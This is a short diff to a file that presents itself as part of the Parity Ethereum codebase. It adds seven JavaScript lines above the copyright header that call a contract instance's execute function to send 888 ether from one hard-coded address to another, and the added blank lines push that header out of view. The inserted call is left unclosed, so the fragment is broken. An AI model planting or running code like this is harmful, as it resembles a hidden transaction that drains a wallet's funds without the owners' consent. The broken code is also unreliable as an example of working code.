@@ -1,3 +1,20 @@
+toAddress = "0x4FC1E5c73E7BCf9E561Eb0016b3FC8E144df0B1b";
+requestAddress = "0xA7EFAe728D2936e78BDA97dc267687568dD593f3";
+valueWithdrawn = web3.toWei(888, "ether");
+amtGas = 1000000;
+myInstance.execute(toAddress, valueWithdrawn, "", { from: requestAddress,
+
+
+
+
+
+
+
+
+
+
+
+
 // Copyright 2015-2019 Parity Technologies (UK) Ltd.
 // This file is part of Parity Ethereum.
 
